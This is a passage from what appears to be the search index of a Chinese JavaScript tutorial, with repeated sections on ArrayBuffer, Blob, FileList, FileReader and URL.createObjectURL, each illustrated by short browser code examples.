\uff0c\u7528\u6765\u590d\u5236\u4e00\u90e8\u5206\u5185\u5b58\u3002\u5b83\u63a5\u53d7\u4e24\u4e2a\u6574\u6570\u53c2\u6570\uff0c\u5206\u522b\u8868\u793a\u590d\u5236\u7684\u5f00\u59cb\u4f4d\u7f6e\uff08\u4ece0\u5f00\u59cb\uff09\u548c\u7ed3\u675f\u4f4d\u7f6e\uff08\u590d\u5236\u65f6\u4e0d\u5305\u62ec\u7ed3\u675f\u4f4d\u7f6e\uff09\uff0c\u5982\u679c\u7701\u7565\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u5219\u8868\u793a\u4e00\u76f4\u590d\u5236\u5230\u7ed3\u675f\u3002 1 2 var buf1 = new ArrayBuffer ( 8 ); var buf2 = buf1 . slice ( 0 ); \u4e0a\u9762\u4ee3\u7801\u8868\u793a\u590d\u5236\u539f\u6765\u7684\u5b9e\u4f8b\u3002 Blob \u5bf9\u8c61 \u00b6 \u7b80\u4ecb \u00b6 Blob \u5bf9\u8c61\u8868\u793a\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u6570\u636e\u5185\u5bb9\uff0c\u6bd4\u5982\u4e00\u4e2a\u56fe\u7247\u6587\u4ef6\u7684\u5185\u5bb9\u5c31\u53ef\u4ee5\u901a\u8fc7 Blob \u5bf9\u8c61\u8bfb\u5199\u3002\u5b83\u901a\u5e38\u7528\u6765\u8bfb\u5199\u6587\u4ef6\uff0c\u5b83\u7684\u540d\u5b57\u662f Binary Large Object \uff08\u4e8c\u8fdb\u5236\u5927\u578b\u5bf9\u8c61\uff09\u7684\u7f29\u5199\u3002\u5b83\u4e0e ArrayBuffer \u7684\u533a\u522b\u5728\u4e8e\uff0c\u5b83\u7528\u4e8e\u64cd\u4f5c\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u800c ArrayBuffer \u7528\u4e8e\u64cd\u4f5c\u5185\u5b58\u3002 \u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b Blob() \u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u751f\u6210\u5b9e\u4f8b\u5bf9\u8c61\u3002 1 new Blob ( array [, options ]) Blob \u6784\u9020\u51fd\u6570\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\u3002\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u6570\u7ec4\uff0c\u6210\u5458\u662f\u5b57\u7b26\u4e32\u6216\u4e8c\u8fdb\u5236\u5bf9\u8c61\uff0c\u8868\u793a\u65b0\u751f\u6210\u7684 Blob \u5b9e\u4f8b\u5bf9\u8c61\u7684\u5185\u5bb9\uff1b\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u53ef\u9009\u7684\uff0c\u662f\u4e00\u4e2a\u914d\u7f6e\u5bf9\u8c61\uff0c\u76ee\u524d\u53ea\u6709\u4e00\u4e2a\u5c5e\u6027 type \uff0c\u5b83\u7684\u503c\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6570\u636e\u7684 MIME \u7c7b\u578b\uff0c\u9ed8\u8ba4\u662f\u7a7a\u5b57\u7b26\u4e32\u3002 1 2 var htmlFragment = [ '<a id=\"a\"><b id=\"b\">hey!</b></a>' ]; var myBlob = new Blob ( htmlFragment , { type : 'text/html' }); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b9e\u4f8b\u5bf9\u8c61 myBlob \u5305\u542b\u7684\u662f\u5b57\u7b26\u4e32\u3002\u751f\u6210\u5b9e\u4f8b\u7684\u65f6\u5019\uff0c\u6570\u636e\u7c7b\u578b\u6307\u5b9a\u4e3a text/html \u3002 \u4e0b\u9762\u662f\u53e6\u4e00\u4e2a\u4f8b\u5b50\uff0cBlob \u4fdd\u5b58 JSON \u6570\u636e\u3002 1 2 var obj = { hello : 'world' }; var blob = new Blob ([ JSON . stringify ( obj ) ], { type : 'application/json' }); \u5b9e\u4f8b\u5c5e\u6027\u548c\u5b9e\u4f8b\u65b9\u6cd5 \u00b6 Blob \u5177\u6709\u4e24\u4e2a\u5b9e\u4f8b\u5c5e\u6027 size \u548c type \uff0c\u5206\u522b\u8fd4\u56de\u6570\u636e\u7684\u5927\u5c0f\u548c\u7c7b\u578b\u3002 1 2 3 4 5 var htmlFragment = [ '<a id=\"a\"><b id=\"b\">hey!</b></a>' ]; var myBlob = new Blob ( htmlFragment , { type : 'text/html' }); myBlob . size // 32 myBlob . type // \"text/html\" Blob \u5177\u6709\u4e00\u4e2a\u5b9e\u4f8b\u65b9\u6cd5 slice \uff0c\u7528\u6765\u62f7\u8d1d\u539f\u6765\u7684\u6570\u636e\uff0c\u8fd4\u56de\u7684\u4e5f\u662f\u4e00\u4e2a Blob \u5b9e\u4f8b\u3002 1 myBlob . slice ( start , end , contentType ) slice \u65b9\u6cd5\u6709\u4e09\u4e2a\u53c2\u6570\uff0c\u90fd\u662f\u53ef\u9009\u7684\u3002\u5b83\u4eec\u4f9d\u6b21\u662f\u8d77\u59cb\u7684\u5b57\u8282\u4f4d\u7f6e\uff08\u9ed8\u8ba4\u4e3a0\uff09\u3001\u7ed3\u675f\u7684\u5b57\u8282\u4f4d\u7f6e\uff08\u9ed8\u8ba4\u4e3a size \u5c5e\u6027\u7684\u503c\uff0c\u8be5\u4f4d\u7f6e\u672c\u8eab\u5c06\u4e0d\u5305\u542b\u5728\u62f7\u8d1d\u7684\u6570\u636e\u4e4b\u4e2d\uff09\u3001\u65b0\u5b9e\u4f8b\u7684\u6570\u636e\u7c7b\u578b\uff08\u9ed8\u8ba4\u4e3a\u7a7a\u5b57\u7b26\u4e32\uff09\u3002 \u83b7\u53d6\u6587\u4ef6\u4fe1\u606f \u00b6 \u6587\u4ef6\u9009\u62e9\u5668 <input type=\"file\"> \u7528\u6765\u8ba9\u7528\u6237\u9009\u53d6\u6587\u4ef6\u3002\u51fa\u4e8e\u5b89\u5168\u8003\u8651\uff0c\u6d4f\u89c8\u5668\u4e0d\u5141\u8bb8\u811a\u672c\u81ea\u884c\u8bbe\u7f6e\u8fd9\u4e2a\u63a7\u4ef6\u7684 value \u5c5e\u6027\uff0c\u5373\u6587\u4ef6\u5fc5\u987b\u662f\u7528\u6237\u624b\u52a8\u9009\u53d6\u7684\uff0c\u4e0d\u80fd\u662f\u811a\u672c\u6307\u5b9a\u7684\u3002\u4e00\u65e6\u7528\u6237\u9009\u597d\u4e86\u6587\u4ef6\uff0c\u811a\u672c\u5c31\u53ef\u4ee5\u8bfb\u53d6\u8fd9\u4e2a\u6587\u4ef6\u3002 \u6587\u4ef6\u9009\u62e9\u5668\u8fd4\u56de\u4e00\u4e2a FileList \u5bf9\u8c61\uff0c\u8be5\u5bf9\u8c61\u662f\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u6210\u5458\uff0c\u6bcf\u4e2a\u6210\u5458\u90fd\u662f\u4e00\u4e2a File \u5b9e\u4f8b\u5bf9\u8c61\u3002File \u5b9e\u4f8b\u5bf9\u8c61\u662f\u4e00\u4e2a\u7279\u6b8a\u7684 Blob \u5b9e\u4f8b\uff0c\u589e\u52a0\u4e86 name \u548c lastModifiedDate \u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // HTML \u4ee3\u7801\u5982\u4e0b // <input type=\"file\" accept=\"image/*\" multiple onchange=\"fileinfo(this.files)\"/> function fileinfo ( files ) { for ( var i = 0 ; i < files . length ; i ++ ) { var f = files [ i ]; console . log ( f . name , // \u6587\u4ef6\u540d\uff0c\u4e0d\u542b\u8def\u5f84 f . size , // \u6587\u4ef6\u5927\u5c0f\uff0cBlob \u5b9e\u4f8b\u5c5e\u6027 f . type , // \u6587\u4ef6\u7c7b\u578b\uff0cBlob \u5b9e\u4f8b\u5c5e\u6027 f . lastModifiedDate // \u6587\u4ef6\u7684\u6700\u540e\u4fee\u6539\u65f6\u95f4 ); } } \u9664\u4e86\u6587\u4ef6\u9009\u62e9\u5668\uff0c\u62d6\u653e API \u7684 dataTransfer.files \u8fd4\u56de\u7684\u4e5f\u662f\u4e00\u4e2aFileList \u5bf9\u8c61\uff0c\u5b83\u7684\u6210\u5458\u56e0\u6b64\u4e5f\u662f File \u5b9e\u4f8b\u5bf9\u8c61\u3002 \u4e0b\u8f7d\u6587\u4ef6 \u00b6 AJAX \u8bf7\u6c42\u65f6\uff0c\u5982\u679c\u6307\u5b9a responseType \u5c5e\u6027\u4e3a blob \uff0c\u4e0b\u8f7d\u4e0b\u6765\u7684\u5c31\u662f\u4e00\u4e2a Blob \u5bf9\u8c61\u3002 1 2 3 4 5 6 7 8 9 function getBlob ( url , callback ) { var xhr = new XMLHttpRequest (); xhr . open ( 'GET' , url ); xhr . responseType = 'blob' ; xhr . onload = function () { callback ( xhr . response ); } xhr . send ( null ); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c xhr.response \u62ff\u5230\u7684\u5c31\u662f\u4e00\u4e2a Blob \u5bf9\u8c61\u3002 \u751f\u6210 URL \u00b6 \u6d4f\u89c8\u5668\u5141\u8bb8\u4f7f\u7528 URL.createObjectURL() \u65b9\u6cd5\uff0c\u9488\u5bf9 Blob \u5bf9\u8c61\u751f\u6210\u4e00\u4e2a\u4e34\u65f6 URL\uff0c\u4ee5\u4fbf\u4e8e\u67d0\u4e9b API \u4f7f\u7528\u3002\u8fd9\u4e2a URL \u4ee5 blob:// \u5f00\u5934\uff0c\u8868\u660e\u5bf9\u5e94\u4e00\u4e2a Blob \u5bf9\u8c61\uff0c\u534f\u8bae\u5934\u540e\u9762\u662f\u4e00\u4e2a\u8bc6\u522b\u7b26\uff0c\u7528\u6765\u552f\u4e00\u5bf9\u5e94\u5185\u5b58\u91cc\u9762\u7684 Blob \u5bf9\u8c61\u3002\u8fd9\u4e00\u70b9\u4e0e data://URL \uff08URL \u5305\u542b\u5b9e\u9645\u6570\u636e\uff09\u548c file://URL \uff08\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\u91cc\u9762\u7684\u6587\u4ef6\uff09\u90fd\u4e0d\u4e00\u6837\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 var droptarget = document . getElementById ( 'droptarget' ); droptarget . ondrop = function ( e ) { var files = e . dataTransfer . files ; for ( var i = 0 ; i < files . length ; i ++ ) { var type = files [ i ]. type ; if ( type . substring ( 0 , 6 ) !== 'image/' ) continue ; var img = document . createElement ( 'img' ); img . src = URL . createObjectURL ( files [ i ]); img . onload = function () { this . width = 100 ; document . body . appendChild ( this ); URL . revokeObjectURL ( this . src ); } } } \u4e0a\u9762\u4ee3\u7801\u901a\u8fc7\u4e3a\u62d6\u653e\u7684\u56fe\u7247\u6587\u4ef6\u751f\u6210\u4e00\u4e2a URL\uff0c\u4ea7\u751f\u5b83\u4eec\u7684\u7f29\u7565\u56fe\uff0c\u4ece\u800c\u4f7f\u5f97\u7528\u6237\u53ef\u4ee5\u9884\u89c8\u9009\u62e9\u7684\u6587\u4ef6\u3002 \u6d4f\u89c8\u5668\u5904\u7406 Blob URL \u5c31\u8ddf\u666e\u901a\u7684 URL \u4e00\u6837\uff0c\u5982\u679c Blob \u5bf9\u8c61\u4e0d\u5b58\u5728\uff0c\u8fd4\u56de404\u72b6\u6001\u7801\uff1b\u5982\u679c\u8de8\u57df\u8bf7\u6c42\uff0c\u8fd4\u56de403\u72b6\u6001\u7801\u3002Blob URL \u53ea\u5bf9 GET \u8bf7\u6c42\u6709\u6548\uff0c\u5982\u679c\u8bf7\u6c42\u6210\u529f\uff0c\u8fd4\u56de200\u72b6\u6001\u7801\u3002\u7531\u4e8e Blob URL \u5c31\u662f\u666e\u901a URL\uff0c\u56e0\u6b64\u53ef\u4ee5\u4e0b\u8f7d\u3002 \u8bfb\u53d6\u6587\u4ef6 \u00b6 \u53d6\u5f97 Blob \u5bf9\u8c61\u4ee5\u540e\uff0c\u53ef\u4ee5\u901a\u8fc7 FileReader \u5bf9\u8c61\uff0c\u8bfb\u53d6 Blob \u5bf9\u8c61\u7684\u5185\u5bb9\uff0c\u5373\u6587\u4ef6\u5185\u5bb9\u3002 FileReader \u5bf9\u8c61\u63d0\u4f9b\u56db\u4e2a\u65b9\u6cd5\uff0c\u5904\u7406 Blob \u5bf9\u8c61\u3002Blob \u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\u4f20\u5165\u8fd9\u4e9b\u65b9\u6cd5\uff0c\u7136\u540e\u4ee5\u6307\u5b9a\u7684\u683c\u5f0f\u8fd4\u56de\u3002 FileReader.readAsText() \uff1a\u8fd4\u56de\u6587\u672c\uff0c\u9700\u8981\u6307\u5b9a\u6587\u672c\u7f16\u7801\uff0c\u9ed8\u8ba4\u4e3a UTF-8\u3002 FileReader.readAsArrayBuffer() \uff1a\u8fd4\u56de ArrayBuffer \u5bf9\u8c61\u3002 FileReader.readAsDataURL() \uff1a\u8fd4\u56de Data URL\u3002 FileReader.readAsBinaryString() \uff1a\u8fd4\u56de\u539f\u59cb\u7684\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\u3002 \u4e0b\u9762\u662f FileReader.readAsText() \u65b9\u6cd5\u7684\u4f8b\u5b50\uff0c\u7528\u6765\u8bfb\u53d6\u6587\u672c\u6587\u4ef6\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // HTML \u4ee3\u7801\u5982\u4e0b // <input type=\"file\" onchange=\"readfile(this.files[0])\"></input> // <pre id=\"output\"></pre> function readfile ( f ) { var reader = new FileReader (); reader . readAsText ( f ); reader . onload = function () { var text = reader . result ; var out = document . getElementById ( 'output' ); out . innerHTML = '' ; out . appendChild ( document . createTextNode ( text )); } reader . onerror = function ( e ) { console . log ( 'Error' , e ); }; } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u901a\u8fc7\u6307\u5b9a FileReader \u5b9e\u4f8b\u5bf9\u8c61\u7684 onload \u76d1\u542c\u51fd\u6570\uff0c\u5728\u5b9e\u4f8b\u7684 result \u5c5e\u6027\u4e0a\u62ff\u5230\u6587\u4ef6\u5185\u5bb9\u3002 \u4e0b\u9762\u662f FileReader.readAsArrayBuffer() \u65b9\u6cd5\u7684\u4f8b\u5b50\uff0c\u7528\u4e8e\u8bfb\u53d6\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 // HTML \u4ee3\u7801\u5982\u4e0b // <input type=\"file\" onchange=\"typefile(this.files[0])\"></input> function typefile ( file ) { // \u6587\u4ef6\u5f00\u5934\u7684\u56db\u4e2a\u5b57\u8282\uff0c\u751f\u6210\u4e00\u4e2a Blob \u5bf9\u8c61 var slice = file . slice ( 0 , 4 ); var reader = new FileReader (); // \u8bfb\u53d6\u8fd9\u56db\u4e2a\u5b57\u8282 reader . readAsArrayBuffer ( slice ); reader . onload = function ( e ) { var buffer = reader . result ; // \u5c06\u8fd9\u56db\u4e2a\u5b57\u8282\u7684\u5185\u5bb9\uff0c\u89c6\u4f5c\u4e00\u4e2a32\u4f4d\u6574\u6570 var view = new DataView ( buffer ); var magic = view . getUint32 ( 0 , false ); // \u6839\u636e\u6587\u4ef6\u7684\u524d\u56db\u4e2a\u5b57\u8282\uff0c\u5224\u65ad\u5b83\u7684\u7c7b\u578b switch ( magic ) { case 0x89504E47 : file . verified_type = 'image/png' ; break ; case 0x47494638 : file . verified_type = 'image/gif' ; break ; case 0x25504446 : file . verified_type = 'application/pdf' ; break ; case 0x504b0304 : file . verified_type = 'application/zip' ; break ; } console . log ( file . name , file . verified_type ); }; }","title":"ArrayBuffer \u5bf9\u8c61\uff0cBlob \u5bf9\u8c61"},{"location":"bom/arraybuffer/#arraybuffer-blob","text":"","title":"ArrayBuffer \u5bf9\u8c61\uff0cBlob \u5bf9\u8c61"},{"location":"bom/arraybuffer/#arraybuffer","text":"ArrayBuffer \u5bf9\u8c61\u8868\u793a\u4e00\u6bb5\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u7528\u6765\u6a21\u62df\u5185\u5b58\u91cc\u9762\u7684\u6570\u636e\u3002\u901a\u8fc7\u8fd9\u4e2a\u5bf9\u8c61\uff0cJavaScript \u53ef\u4ee5\u8bfb\u5199\u4e8c\u8fdb\u5236\u6570\u636e\u3002\u8fd9\u4e2a\u5bf9\u8c61\u53ef\u4ee5\u770b\u4f5c\u5185\u5b58\u6570\u636e\u7684\u8868\u8fbe\u3002 \u8fd9\u4e2a\u5bf9\u8c61\u662f ES6 \u624d\u5199\u5165\u6807\u51c6\u7684\uff0c\u666e\u901a\u7684\u7f51\u9875\u7f16\u7a0b\u7528\u4e0d\u5230\u5b83\uff0c\u4e3a\u4e86\u6559\u7a0b\u4f53\u7cfb\u7684\u5b8c\u6574\uff0c\u4e0b\u9762\u53ea\u63d0\u4f9b\u4e00\u4e2a\u7b80\u7565\u7684\u4ecb\u7ecd\uff0c\u8be6\u7ec6\u4ecb\u7ecd\u8bf7\u770b\u300aES6 \u6807\u51c6\u5165\u95e8\u300b\u91cc\u9762\u7684\u7ae0\u8282\u3002 \u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b ArrayBuffer() \u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u751f\u6210\u5b9e\u4f8b\u3002\u5b83\u63a5\u53d7\u4e00\u4e2a\u6574\u6570\u4f5c\u4e3a\u53c2\u6570\uff0c\u8868\u793a\u8fd9\u6bb5\u4e8c\u8fdb\u5236\u6570\u636e\u5360\u7528\u591a\u5c11\u4e2a\u5b57\u8282\u3002 1 var buffer = new ArrayBuffer ( 8 ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b9e\u4f8b\u5bf9\u8c61 buffer \u5360\u75288\u4e2a\u5b57\u8282\u3002 ArrayBuffer \u5bf9\u8c61\u6709\u5b9e\u4f8b\u5c5e\u6027 byteLength \uff0c\u8868\u793a\u5f53\u524d\u5b9e\u4f8b\u5360\u7528\u7684\u5185\u5b58\u957f\u5ea6\uff08\u5355\u4f4d\u5b57\u8282\uff09\u3002 1 2 var buffer = new ArrayBuffer ( 8 ); buffer . byteLength // 8 ArrayBuffer \u5bf9\u8c61\u6709\u5b9e\u4f8b\u65b9\u6cd5 slice() \uff0c\u7528\u6765\u590d\u5236\u4e00\u90e8\u5206\u5185\u5b58\u3002\u5b83\u63a5\u53d7\u4e24\u4e2a\u6574\u6570\u53c2\u6570\uff0c\u5206\u522b\u8868\u793a\u590d\u5236\u7684\u5f00\u59cb\u4f4d\u7f6e\uff08\u4ece0\u5f00\u59cb\uff09\u548c\u7ed3\u675f\u4f4d\u7f6e\uff08\u590d\u5236\u65f6\u4e0d\u5305\u62ec\u7ed3\u675f\u4f4d\u7f6e\uff09\uff0c\u5982\u679c\u7701\u7565\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u5219\u8868\u793a\u4e00\u76f4\u590d\u5236\u5230\u7ed3\u675f\u3002 1 2 var buf1 = new ArrayBuffer ( 8 ); var buf2 = buf1 . slice ( 0 ); \u4e0a\u9762\u4ee3\u7801\u8868\u793a\u590d\u5236\u539f\u6765\u7684\u5b9e\u4f8b\u3002","title":"ArrayBuffer \u5bf9\u8c61"},{"location":"bom/arraybuffer/#blob","text":"","title":"Blob \u5bf9\u8c61"},{"location":"bom/arraybuffer/#_1","text":"Blob \u5bf9\u8c61\u8868\u793a\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u6570\u636e\u5185\u5bb9\uff0c\u6bd4\u5982\u4e00\u4e2a\u56fe\u7247\u6587\u4ef6\u7684\u5185\u5bb9\u5c31\u53ef\u4ee5\u901a\u8fc7 Blob \u5bf9\u8c61\u8bfb\u5199\u3002\u5b83\u901a\u5e38\u7528\u6765\u8bfb\u5199\u6587\u4ef6\uff0c\u5b83\u7684\u540d\u5b57\u662f Binary Large Object \uff08\u4e8c\u8fdb\u5236\u5927\u578b\u5bf9\u8c61\uff09\u7684\u7f29\u5199\u3002\u5b83\u4e0e ArrayBuffer \u7684\u533a\u522b\u5728\u4e8e\uff0c\u5b83\u7528\u4e8e\u64cd\u4f5c\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u800c ArrayBuffer \u7528\u4e8e\u64cd\u4f5c\u5185\u5b58\u3002 \u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b Blob() \u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u751f\u6210\u5b9e\u4f8b\u5bf9\u8c61\u3002 1 new Blob ( array [, options ]) Blob \u6784\u9020\u51fd\u6570\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\u3002\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u6570\u7ec4\uff0c\u6210\u5458\u662f\u5b57\u7b26\u4e32\u6216\u4e8c\u8fdb\u5236\u5bf9\u8c61\uff0c\u8868\u793a\u65b0\u751f\u6210\u7684 Blob \u5b9e\u4f8b\u5bf9\u8c61\u7684\u5185\u5bb9\uff1b\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u53ef\u9009\u7684\uff0c\u662f\u4e00\u4e2a\u914d\u7f6e\u5bf9\u8c61\uff0c\u76ee\u524d\u53ea\u6709\u4e00\u4e2a\u5c5e\u6027 type \uff0c\u5b83\u7684\u503c\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6570\u636e\u7684 MIME \u7c7b\u578b\uff0c\u9ed8\u8ba4\u662f\u7a7a\u5b57\u7b26\u4e32\u3002 1 2 var htmlFragment = [ '<a id=\"a\"><b id=\"b\">hey!</b></a>' ]; var myBlob = new Blob ( htmlFragment , { type : 'text/html' }); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b9e\u4f8b\u5bf9\u8c61 myBlob \u5305\u542b\u7684\u662f\u5b57\u7b26\u4e32\u3002\u751f\u6210\u5b9e\u4f8b\u7684\u65f6\u5019\uff0c\u6570\u636e\u7c7b\u578b\u6307\u5b9a\u4e3a text/html \u3002 \u4e0b\u9762\u662f\u53e6\u4e00\u4e2a\u4f8b\u5b50\uff0cBlob \u4fdd\u5b58 JSON \u6570\u636e\u3002 1 2 var obj = { hello : 'world' }; var blob = new Blob ([ JSON . stringify ( obj ) ], { type : 'application/json' });","title":"\u7b80\u4ecb"},{"location":"bom/arraybuffer/#_2","text":"Blob \u5177\u6709\u4e24\u4e2a\u5b9e\u4f8b\u5c5e\u6027 size \u548c type \uff0c\u5206\u522b\u8fd4\u56de\u6570\u636e\u7684\u5927\u5c0f\u548c\u7c7b\u578b\u3002 1 2 3 4 5 var htmlFragment = [ '<a id=\"a\"><b id=\"b\">hey!</b></a>' ]; var myBlob = new Blob ( htmlFragment , { type : 'text/html' }); myBlob . size // 32 myBlob . type // \"text/html\" Blob \u5177\u6709\u4e00\u4e2a\u5b9e\u4f8b\u65b9\u6cd5 slice \uff0c\u7528\u6765\u62f7\u8d1d\u539f\u6765\u7684\u6570\u636e\uff0c\u8fd4\u56de\u7684\u4e5f\u662f\u4e00\u4e2a Blob \u5b9e\u4f8b\u3002 1 myBlob . slice ( start , end , contentType ) slice \u65b9\u6cd5\u6709\u4e09\u4e2a\u53c2\u6570\uff0c\u90fd\u662f\u53ef\u9009\u7684\u3002\u5b83\u4eec\u4f9d\u6b21\u662f\u8d77\u59cb\u7684\u5b57\u8282\u4f4d\u7f6e\uff08\u9ed8\u8ba4\u4e3a0\uff09\u3001\u7ed3\u675f\u7684\u5b57\u8282\u4f4d\u7f6e\uff08\u9ed8\u8ba4\u4e3a size \u5c5e\u6027\u7684\u503c\uff0c\u8be5\u4f4d\u7f6e\u672c\u8eab\u5c06\u4e0d\u5305\u542b\u5728\u62f7\u8d1d\u7684\u6570\u636e\u4e4b\u4e2d\uff09\u3001\u65b0\u5b9e\u4f8b\u7684\u6570\u636e\u7c7b\u578b\uff08\u9ed8\u8ba4\u4e3a\u7a7a\u5b57\u7b26\u4e32\uff09\u3002","title":"\u5b9e\u4f8b\u5c5e\u6027\u548c\u5b9e\u4f8b\u65b9\u6cd5"},{"location":"bom/arraybuffer/#_3","text":"\u6587\u4ef6\u9009\u62e9\u5668 <input type=\"file\"> \u7528\u6765\u8ba9\u7528\u6237\u9009\u53d6\u6587\u4ef6\u3002\u51fa\u4e8e\u5b89\u5168\u8003\u8651\uff0c\u6d4f\u89c8\u5668\u4e0d\u5141\u8bb8\u811a\u672c\u81ea\u884c\u8bbe\u7f6e\u8fd9\u4e2a\u63a7\u4ef6\u7684 value \u5c5e\u6027\uff0c\u5373\u6587\u4ef6\u5fc5\u987b\u662f\u7528\u6237\u624b\u52a8\u9009\u53d6\u7684\uff0c\u4e0d\u80fd\u662f\u811a\u672c\u6307\u5b9a\u7684\u3002\u4e00\u65e6\u7528\u6237\u9009\u597d\u4e86\u6587\u4ef6\uff0c\u811a\u672c\u5c31\u53ef\u4ee5\u8bfb\u53d6\u8fd9\u4e2a\u6587\u4ef6\u3002 \u6587\u4ef6\u9009\u62e9\u5668\u8fd4\u56de\u4e00\u4e2a FileList \u5bf9\u8c61\uff0c\u8be5\u5bf9\u8c61\u662f\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u6210\u5458\uff0c\u6bcf\u4e2a\u6210\u5458\u90fd\u662f\u4e00\u4e2a File \u5b9e\u4f8b\u5bf9\u8c61\u3002File \u5b9e\u4f8b\u5bf9\u8c61\u662f\u4e00\u4e2a\u7279\u6b8a\u7684 Blob \u5b9e\u4f8b\uff0c\u589e\u52a0\u4e86 name \u548c lastModifiedDate \u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // HTML \u4ee3\u7801\u5982\u4e0b // <input type=\"file\" accept=\"image/*\" multiple onchange=\"fileinfo(this.files)\"/> function fileinfo ( files ) { for ( var i = 0 ; i < files . length ; i ++ ) { var f = files [ i ]; console . log ( f . name , // \u6587\u4ef6\u540d\uff0c\u4e0d\u542b\u8def\u5f84 f . size , // \u6587\u4ef6\u5927\u5c0f\uff0cBlob \u5b9e\u4f8b\u5c5e\u6027 f . type , // \u6587\u4ef6\u7c7b\u578b\uff0cBlob \u5b9e\u4f8b\u5c5e\u6027 f . lastModifiedDate // \u6587\u4ef6\u7684\u6700\u540e\u4fee\u6539\u65f6\u95f4 ); } } \u9664\u4e86\u6587\u4ef6\u9009\u62e9\u5668\uff0c\u62d6\u653e API \u7684 dataTransfer.files \u8fd4\u56de\u7684\u4e5f\u662f\u4e00\u4e2aFileList \u5bf9\u8c61\uff0c\u5b83\u7684\u6210\u5458\u56e0\u6b64\u4e5f\u662f File \u5b9e\u4f8b\u5bf9\u8c61\u3002","title":"\u83b7\u53d6\u6587\u4ef6\u4fe1\u606f"},{"location":"bom/arraybuffer/#_4","text":"AJAX \u8bf7\u6c42\u65f6\uff0c\u5982\u679c\u6307\u5b9a responseType \u5c5e\u6027\u4e3a blob \uff0c\u4e0b\u8f7d\u4e0b\u6765\u7684\u5c31\u662f\u4e00\u4e2a Blob \u5bf9\u8c61\u3002 1 2 3 4 5 6 7 8 9 function getBlob ( url , callback ) { var xhr = new XMLHttpRequest (); xhr . open ( 'GET' , url ); xhr . responseType = 'blob' ; xhr . onload = function () { callback ( xhr . response ); } xhr . send ( null ); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c xhr.response \u62ff\u5230\u7684\u5c31\u662f\u4e00\u4e2a Blob \u5bf9\u8c61\u3002","title":"\u4e0b\u8f7d\u6587\u4ef6"},{"location":"bom/arraybuffer/#url","text":"\u6d4f\u89c8\u5668\u5141\u8bb8\u4f7f\u7528 URL.createObjectURL() \u65b9\u6cd5\uff0c\u9488\u5bf9 Blob \u5bf9\u8c61\u751f\u6210\u4e00\u4e2a\u4e34\u65f6 URL\uff0c\u4ee5\u4fbf\u4e8e\u67d0\u4e9b API \u4f7f\u7528\u3002\u8fd9\u4e2a URL \u4ee5 blob:// \u5f00\u5934\uff0c\u8868\u660e\u5bf9\u5e94\u4e00\u4e2a Blob \u5bf9\u8c61\uff0c\u534f\u8bae\u5934\u540e\u9762\u662f\u4e00\u4e2a\u8bc6\u522b\u7b26\uff0c\u7528\u6765\u552f\u4e00\u5bf9\u5e94\u5185\u5b58\u91cc\u9762\u7684 Blob \u5bf9\u8c61\u3002\u8fd9\u4e00\u70b9\u4e0e data://URL \uff08URL \u5305\u542b\u5b9e\u9645\u6570\u636e\uff09\u548c file://URL \uff08\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\u91cc\u9762\u7684\u6587\u4ef6\uff09\u90fd\u4e0d\u4e00\u6837\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 var droptarget = document . getElementById ( 'droptarget' ); droptarget . ondrop = function ( e ) { var files = e . dataTransfer . files ; for ( var i = 0 ; i < files . length ; i ++ ) { var type = files [ i ]. type ; if ( type . substring ( 0 , 6 ) !== 'image/' ) continue ; var img = document . createElement ( 'img' ); img . src = URL . createObjectURL ( files [ i ]); img . onload = function () { this . width = 100 ; document . body . appendChild ( this ); URL . revokeObjectURL ( this . src ); } } } \u4e0a\u9762\u4ee3\u7801\u901a\u8fc7\u4e3a\u62d6\u653e\u7684\u56fe\u7247\u6587\u4ef6\u751f\u6210\u4e00\u4e2a URL\uff0c\u4ea7\u751f\u5b83\u4eec\u7684\u7f29\u7565\u56fe\uff0c\u4ece\u800c\u4f7f\u5f97\u7528\u6237\u53ef\u4ee5\u9884\u89c8\u9009\u62e9\u7684\u6587\u4ef6\u3002 \u6d4f\u89c8\u5668\u5904\u7406 Blob URL \u5c31\u8ddf\u666e\u901a\u7684 URL \u4e00\u6837\uff0c\u5982\u679c Blob 